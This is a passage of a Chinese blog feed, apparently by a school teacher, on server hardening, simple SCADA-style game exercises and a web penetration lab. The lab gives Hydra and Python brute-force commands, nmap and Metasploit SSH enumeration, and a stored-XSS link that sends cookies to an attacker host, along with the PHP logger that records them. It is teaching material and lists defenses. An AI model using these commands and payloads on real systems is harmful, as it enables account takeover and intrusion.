punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4.使用Mysql内置MD5加密函数加密用户user1的密码为(P@ssw0rd1!);</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">update user set password<span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token char">'P@ssw0rd1!'</span><span class="token punctuation">)</span> where User<span class="token operator">=</span><span class="token char">'user1'</span><span class="token punctuation">;</span>flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>5.赋予user1用户对数据库所有表只有select,insert,delete,update权限；</strong></p><pre class="line-numbers language-none"><code class="language-none">show grants for 'user1'@'localhost';grant select,insert,delete,update on *.* to 'user1'@'localhost';flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>6.对忘记mysql数据库root管理员密码进行重置操作</strong><br><code>vim /etc/my.cnf</code><br>在[mysqld]下面加入<br><code>skip-grant-tables</code> (跳过权限检查启动)<br>修改完后重启Mysql服务，<code>service mysqld restart</code><br>mysql –u root –p<br>use mysql;<br><code>update user set Password='123.com' where User='root';</code><br>flush privileges;</p><h2 id="A-3任务三-Web安全加固"><a href="#A-3任务三-Web安全加固" class="headerlink" title="A-3任务三 Web安全加固"></a>A-3任务三 Web安全加固</h2><p><strong>1.为了防止web中.mdb数据库文件非法下载请对Web配置文件进行安全加固</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— Default Web Site —— 请求筛选 —— 拒绝文件扩展名，添加扩展名.mdb<br><strong>2.限制目录执行权限，对picture 和 upload 目录是指执行权限为无</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— Default Web Site —— picture/upload —— 处理程序映射—— 编辑功能权限，取消勾选<strong>执行</strong><br><strong>3.开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户IP地址、用户名、方法)</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— web —— 日志，格式选择W3C，点击选择字段，只勾选日期、时间、客户端IP地址、用户名、方法<br><strong>4.为了减轻网站负载，设置网站最大并发连接数为1000</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— 右侧-设置网站默认设置，设置限制连接数值1000<br><strong>5.防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露</strong><br>CMD 执行命令 fsutil behavior set disable8dot3 1<br><strong>6.关闭IIS的WebDAV功能增强网站的安全性</strong><br>管理工具 —— IIS管理器 ——主机名(WIN-FVEF7SF4TF5) —— ISAPI 和 CGI 限制，右键WebDav，点击拒绝</p><h2 id="A-6任务六-服务加固SSH-VSFTPD（P9Linux渗透）"><a href="#A-6任务六-服务加固SSH-VSFTPD（P9Linux渗透）" class="headerlink" title="A-6任务六 服务加固SSH\VSFTPD（P9Linux渗透）"></a>A-6任务六 服务加固SSH\VSFTPD（P9Linux渗透）</h2><p><strong>1. 修改ssh服务端口为2222；</strong><br>   修改ssh服务配置文件，<code>vim /etc/ssh/sshd_config</code><br>   查找 Port, 将注释取消，并将Port的值22改为2222<br><strong>2. ssh禁止Root用户远程登录；</strong><br>   vim中<code>/关键词</code>进行查找<br>   查找 <code>PermitRootLogin</code>, 修改值为no<br><strong>3. vsFTPd禁止匿名用户上传；</strong><br>   将 <code>anon_upload_enable</code> 注释取消，并将值改为 NO,<br>   并重启vsftpd服务<code>service vsftpd restart</code><br><strong>4. 激活 vsFTPd 上传下载日志；</strong><br>   将 <code>xferlog_enable</code> 的值设置为 YES<br>   #启用改选项，系统会记录上传下载的日志。默认情况下，日志文件为 /var/log/vsftpd.log<br><strong>5. vsFTPd 同一个IP只能连接两个；</strong><br>   在文件底部新增一行<code> max_per_ip=2</code>，并重启vsFTPd 服务.<br><strong>6. vsFTPd 将使客户端连接时的端口范围在 50000 和 60000 之间；</strong><br>   在文件底部新增两行，并重启vsFTPd服务<br>   <code>pasv_min_port=50000</code><br>   <code>pasv_max_port=60000</code><br><strong>7. vsFTPd 使本地用户登录活动范围限制在home目录；</strong><br>   取消 <code>chroot_local_user</code> 和 <code>chroot_list_enable</code> 的注释，<br>   将 <code>chroot_local_user</code> 和 <code>chroot_list_enable</code> 的值分别改为 YES 和 NO</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小游戏开发入门</title>
      <link href="/2022/11/11/%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
      <url>/2022/11/11/%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1、航天飞机"><a href="#1、航天飞机" class="headerlink" title="1、航天飞机"></a>1、航天飞机</h1><ul><li>1.新建工程（记得先在桌面创建一个自己的文件夹作为工程目录）</li><li>2.点击开发进入开发界面</li><li>3.选中画面—新建—填写画面名称</li><li>4.右键—画面属性—背景色</li><li>5.图库—打开图库—开关（双击）</li><li>6.切换到工程浏览器—系统配置—设置开发系统—设置运行系统—主画面配置</li><li>7.文件—全部存—切换到view</li><li>8.双击开关—点击变量名旁边的？—新建变量—变量名是加油开关，变量类型是内存离散—选中刚才创建的发射开关变量—点击确定</li><li>10.图库—自己选一个好看的油罐吧（反应器）</li><li>11.双击油罐—点？号—新建变量—变量名：油量，变量类型：内存整数—关联刚才新建的变量</li><li>12.工程浏览器—数据词典—修改油量的初始值为100</li><li>13.右键—画面属性—命令语言<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\加油开关<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\油量 <span class="token operator">=</span> \\本站点\油量 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>14.图库里面选择一个好看的仪表盘—双击仪表—点？号关联上油量</li><li>15.工程浏览器-系统配置-设置开发系统-设置运行系统-特殊-运行系统基准频率-100毫秒</li><li>16.右键—画面属性—命令语言-每100毫秒</li><li>17.工具箱—多边形—画一个火箭（最后一个点双击结束）</li><li>18.在工具箱中画一条管道—选中管道—流动—流动的条件是<code>\\本站点\加油开关 &amp;&amp; \\本站点\油量&gt;0</code></li><li>19.在图库里选一个按钮，双击按钮，点？，新建变量，发射按钮，并且双击关联上。</li><li>20.双击火箭—垂直移动—点？—新建变量—火箭移动距离（整数，初始值为0）—双击关联</li><li>21.右键—画面属性—命令语言<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\油量<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> \\本站点\发射开关<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\火箭移动距离 <span class="token operator">=</span> \\本站点\火箭移动距离 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>22.画一个好看的火焰，双击火焰，隐含，\本站点\火箭移动距离 == 0时<strong>隐含</strong><h1 id="2、爱心表白"><a href="#2、爱心表白" class="headerlink" title="2、爱心表白"></a>2、爱心表白</h1></li></ul><ol><li>工程浏览器—新建一个画面—爱心表白</li><li>切换到工程浏览器—系统配置—设置开发系统—设置运行系统—主画面配置—设置爱心表白为主画面</li><li>工程浏览器—数据库—数据词典—新建—灯1~灯5（内存离散）</li><li>图库里面自己选几个好看的灯</li><li>把几个灯分别关联上各自的变量</li><li>用工具箱里的多边形画一个桃心</li><li>双击桃心—按下时<pre class="line-numbers language-c" data-language="c"><code class="language-c">\\本站点\灯<span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>右键—画面属性—命令语言<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\灯<span class="token number">1</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\灯<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="3、到五秒就停下！"><a href="#3、到五秒就停下！" class="headerlink" title="3、到五秒就停下！"></a>3、到五秒就停下！</h1></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//计数</span><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\开关<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>\\本站点\计数<span class="token operator">=</span>\\本站点\计数<span class="token operator">+</span><span class="token number">0.1</span><span class="token punctuation">;</span><span class="token comment">//判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>\\本站点\计数<span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0.00001</span><span class="token operator">&amp;&amp;</span>\\本站点\开关<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>\\本站点\成功判定<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span> \\本站点\成功判定<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>\\本站点\计数<span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0.00001</span><span class="token operator">&amp;&amp;</span>\\本站点\开关<span class="token operator">==</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>\\本站点\计数<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>\\本站点\失败判定<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span> \\本站点\失败判定<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小游戏开发入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全Web渗透</title>
      <link href="/2022/11/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8Web%E6%B8%97%E9%80%8F/"/>
      <url>/2022/11/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8Web%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1><h2 id="一、爆破HTTP表单密码"><a href="#一、爆破HTTP表单密码" class="headerlink" title="一、爆破HTTP表单密码"></a>一、爆破HTTP表单密码</h2><h3 id="1-Hydra爆破"><a href="#1-Hydra爆破" class="headerlink" title="1.Hydra爆破"></a>1.Hydra爆破</h3><ol><li>启动OWASP漏洞靶机</li><li>输入IP地址打开网页</li><li>打开Damn Vulnerable Web Application</li><li>开始抓包，在登录界面按下F12，选中Network选项卡，随便输入账号密码，点击Login。</li><li>成功抓取到login.php，记录Request URL、Form Data以及Response</li><li>打开kali虚拟机，右键打开终端</li></ol><pre class="line-numbers language-none"><code class="language-none">hydra -l admin -P passw.txt 192.168.148.130 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed" -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-l</code>表示单个用户名（使用<code>-L</code>表示用户名字典）<br><code>-P</code>表示使用密码字典<br><code>-V</code>用于显示每次尝试的详细输出<br><code>-o</code>表示保存结果到文件<br><code>-f</code>表示只要破解到第一个有效密码就停止<br><code>:</code>后是登录失败表单返回的信息</p><h3 id="2-Python爆破"><a href="#2-Python爆破" class="headerlink" title="2.Python爆破"></a>2.Python爆破</h3><p>登录进DVWA漏洞靶机之后，靶机给我们提供了一个暴力破解密码的接口，就是第四个，Brute Force<br>为了深入理解爆破原理，这次我们不用工具，自己写代码进行破解，这里使用最简单的Python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspwds <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">)</span><span class="token keyword">for</span> pwd <span class="token keyword">in</span> pwds<span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://192.168.26.131/dvwa/vulnerabilities/brute/"</span>    <span class="token comment"># Python strip() 方法用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列。</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>     params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span>pwd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Login"</span><span class="token punctuation">:</span><span class="token string">"Login"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>     <span class="token comment"># 身份信息，即cookie，必须是最新的，有效的</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span>"security<span class="token operator">=</span>low<span class="token punctuation">;</span> \        PHPSESSID<span class="token operator">=</span>jbvcllt5hbruibl548pco9pq71<span class="token punctuation">;</span> acopendivids<span class="token operator">=</span>swingset<span class="token punctuation">,</span>jotto<span class="token punctuation">,</span>phpbb2<span class="token punctuation">,</span>redmine<span class="token punctuation">;</span> acgroupswithpersist<span class="token operator">=</span>nada"<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment">#print(resp.text)</span>    <span class="token keyword">if</span> <span class="token string">'Username and/or password incorrect.'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'破解失败：'</span><span class="token operator">+</span>pwd<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'破解成功：'</span><span class="token operator">+</span>pwd<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>pwds<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和之前一样，抓包，然后模拟浏览器发送请求，唯一不同的就是需要注意，发送的请求需携带身份信息，因为这个操作必须在登录状态才可以执行</p><h3 id="3-BurpSuite爆破"><a href="#3-BurpSuite爆破" class="headerlink" title="3.BurpSuite爆破"></a>3.BurpSuite爆破</h3><ol><li><p>在Kali中打开BurpSuite，设置代理（proxy）的设置的端口为允许所有端口</p></li><li><p>打开火狐浏览器-设置-网络设置-手动配置代理-设置为Kali机器的IP</p></li><li><p>在火狐浏览器中提交表单，请求就已经被代理服务器拦截了</p></li><li><p>回到BurpSuite可以看到被拦截包的具体内容，右键，Send to Intruder</p></li><li><p>打开Intruder选项卡，clear$，add$</p></li><li><p>在Payload载荷中添加进字典，就可以开始爆破了</p></li></ol><h4 id="几种攻击模式"><a href="#几种攻击模式" class="headerlink" title="几种攻击模式"></a>几种攻击模式</h4><ol><li>Sniper 狙击手<br>只能破解一个字段，即只能选择一个payloadset。</li><li>Battering ram 攻城锤<br>不管有几个参数，都只能用相同的字典值</li><li>Pitchfork 草叉<br>有几个参数就需要设置几个字典，而且会按顺序匹配同时使用，不会交叉验证。<br>如果两个payload的数量不匹配，以少的为准，多余的丢弃。</li><li>Cluster bomb 榴霰弹<br>产生笛卡尔积，简单来说就是和草叉相反。</li></ol><h3 id="4-爆破机房选课系统登录密码"><a href="#4-爆破机房选课系统登录密码" class="headerlink" title="4.爆破机房选课系统登录密码"></a>4.爆破机房选课系统登录密码</h3><p>先不要看答案，自己试一试</p><pre class="line-numbers language-none"><code class="language-none">hydra -l pwh -p password.txt 10.163.72.11 http-post-form "/index/index/login.html:username=^USER^&amp;password=^PASS^:失败" -V -o JJ.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、爆破SSH密码"><a href="#二、爆破SSH密码" class="headerlink" title="二、爆破SSH密码"></a>二、爆破SSH密码</h2><h3 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h3><ol><li>ping扫描  <code>—sP</code><pre class="line-numbers language-none"><code class="language-none">nmap -sP 10.163.72.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>指定端口范围  <code>—p m-n</code><pre class="line-numbers language-none"><code class="language-none">nmap -p 22,80 10.163.72.55 #-p- 表示对所有端口进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>服务版本探测 <code>-sV</code><pre class="line-numbers language-none"><code class="language-none">nmap -p 22,80 10.163.72.55 -sV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>全面扫描 <code>-A</code><pre class="line-numbers language-none"><code class="language-none">nmap -A 10.163.72.55<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>保存结果<pre class="line-numbers language-none"><code class="language-none">nmap -sn 101.37.79.1/24 -oX JJ.xml #默认保存在nmap安装根目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>其他参数</li></ol><ul><li>端口状态：<a href="https://blog.csdn.net/lee244868149/article/details/39177669">https://blog.csdn.net/lee244868149/article/details/39177669</a></li><li><code>-Pn</code>参数可以停止ICMP请求，避免触发防火墙的安全机制</li><li><code>-v</code>表示需要持续返回解析的信息</li><li><code>-T4</code>表示采用什么速度进行探测，范围0-5</li></ul><h3 id="2-用户名枚举"><a href="#2-用户名枚举" class="headerlink" title="2.用户名枚举"></a>2.用户名枚举</h3><ol><li>在kail里输入msfconsole打开msf，退出输入exit</li><li>因为msf中的模块太多了，我们想要找ssh有关的模块，只有使用搜索功能。<pre class="line-numbers language-none"><code class="language-none">search ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>找到用户枚举的模块<pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/ssh/ssh_enumusers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看参数设置<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>设置必要的参数<pre class="line-numbers language-none"><code class="language-none">set threshold 5  # 设置线程数为5set rhosts 192.168.148.130  #  设置地址，地址也可以是一个网段set USER_FILE teacher_name.txt # 设置需要使用的账号字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>运行<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="3-开始爆破"><a href="#3-开始爆破" class="headerlink" title="3.开始爆破"></a>3.开始爆破</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P password.txt 192.168.148.130 ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用msf，感觉速度会更快一些，操作和上述相似，只有两步不同。</p><ol><li>找到相应模块<pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/ssh/ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>设置必要参数<pre class="line-numbers language-none"><code class="language-none">set rhosts 192.168.26.130set username rootset PASS_FILE password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="三、爆破FTP密码"><a href="#三、爆破FTP密码" class="headerlink" title="三、爆破FTP密码"></a>三、爆破FTP密码</h2>账号字典和密码字典我的ftp：pwhdown<br>不要问账号字典怎么来的，问就是捡来的<pre class="line-numbers language-none"><code class="language-none">hydra -L teacher_name.txt -P pass.txt -f 10.163.72.248 ftp -o JJ.txt -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="四、防御"><a href="#四、防御" class="headerlink" title="四、防御"></a>四、防御</h2><ol><li>密码使用带https的密文传输和存储</li><li>限制错误次数，锁定账户</li><li>增加尝试间隔，sleep(3)</li><li>验证码，图片验证码、短信验证码、二维码验证码</li><li>统计尝试频率，锁定IP地址</li><li>token机制</li></ol><h2 id="四、特别声明"><a href="#四、特别声明" class="headerlink" title="四、特别声明"></a>四、特别声明</h2><p>本网站没有使用登录验证码，可以无限暴力破解，因为这种漏洞不会危害服务器，所以大家随便玩吧（只有我的账号是超级管理员，是强密码，所以可以不用白费工夫了）。</p><p>特别声明一点，本网站是用于海盐商贸学校计算机专业实战演练的漏洞靶机网站，只能用于学习网络安全相关知识，磨练技能，请记得我们是白帽子阵营，请勿违反<strong>《中华人民共和国网络安全法》</strong>，从事违法犯罪，否则后果自负</p><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="一、常用Javascript语句"><a href="#一、常用Javascript语句" class="headerlink" title="一、常用Javascript语句"></a>一、常用Javascript语句</h2><h3 id="1-弹窗警告"><a href="#1-弹窗警告" class="headerlink" title="1.弹窗警告"></a>1.弹窗警告</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'你好，恭喜，你账号密码没了'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-页面嵌套"><a href="#2-页面嵌套" class="headerlink" title="2.页面嵌套"></a>2.页面嵌套</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>http://10.163.72.55</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>300</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>300</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-页面重定向"><a href="#3-页面重定向" class="headerlink" title="3.页面重定向"></a>3.页面重定向</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"本站已停用，请移步到我们新网站并重新登录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://10.163.72.55/"</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-访问外部js"><a href="#4-访问外部js" class="headerlink" title="4.访问外部js"></a>4.访问外部js</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://10.163.72.55/xss.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、手动获取cookie"><a href="#二、手动获取cookie" class="headerlink" title="二、手动获取cookie"></a>二、手动获取cookie</h2><ol><li>另外打开一台kail的虚拟机，作为攻击机</li><li>启动apache服务器<pre class="line-numbers language-none"><code class="language-none">service apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>在网站根目录写入一个盗取cookie的js脚本<pre class="line-numbers language-none"><code class="language-none">vim /var/www/html/get_cookie.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment"># 获取cookie</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 以追加方式打开文件，如果没有会自动创建</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 保存文件，记得换行</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 关闭文件</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'恭喜，你密码账号没了'</span><span class="token punctuation">;</span>  <span class="token comment"># 嘲讽拉满</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><em>注意在linux中，ctrl+shift+v才是复制，或者直接按鼠标滚轮也可以</em></li><li>常用vim命令（补充）</li></ol><ul><li><code>i</code>插入模式</li><li><code>o</code>在下一行插入</li><li><code>esc + :wq</code>保存并退出</li><li><code>esc + :e!</code>不保存退出</li><li><code>ctrl+v</code>可视块操作，<code>I</code>插入，<code>esc</code>保存，<code>d</code>删除</li></ul><ol start="5"><li>在地址栏输入kali虚机的ip地址/get_cookie.php，如果没有报404错误，就表示文件存在，当然也可以cat /var/www/html/get_cookie.php再次确认一下</li><li>打开根目录下的写权限<pre class="line-numbers language-none"><code class="language-none">ls -s # 查看权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">chown -R www-data.www-data /var/www/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>登录DVWA靶机，选择XSS stored，现在可以布置脚本了，注意这里的诱导文字很重要，很考验水平。<pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;a href=javascript:location.href="http://10.163.72.55:8090/get_cookie.php?cookie="+document.cookie&gt;兄弟、我找到你想要的资源了，懂的都懂，快来！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>受害者只需要点一下，就可以获得cookie了<pre class="line-numbers language-none"><code class="language-none">cat /var/www/html/cookie.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>盗取账号<br>拿到cookie之后怎么用呢，其实这个cookie就是浏览器缓存的用户身份信息，最简单的方法是安装一个谷歌浏览器插件进行替换，我已经帮你们下载好了，在我的ftp，<strong>pwhdown</strong>，<strong>Cookie Hacker.crx</strong></li></ol><p><em>在谷歌浏览器安装插件时，记得打开开发者模式</em></p><h2 id="三、设置桥接模式"><a href="#三、设置桥接模式" class="headerlink" title="三、设置桥接模式"></a>三、设置桥接模式</h2><p>因为NAT连接的是虚拟交换机，自己的几个虚拟机网卡接到一起，只能自己和自己玩。<br>如果想要连接到真实交换机，先在VMvare点编辑-虚拟网络编辑器-添加网络-VMnet0，选桥接模式，桥接到真实网卡，别连到蓝牙上去了。<br>然后在虚拟机设置中，选择VMnet0（桥接模式），如果外部没有DHCP服务器，我们不能自动获取一个ip地址，就需要自己手动设置一个ip地址。在linux中的方法如下：</p><ol><li>修改网卡配置文件<pre class="line-numbers language-none"><code class="language-none">vim /etc/network/interfaces<span aria-hidden="true" 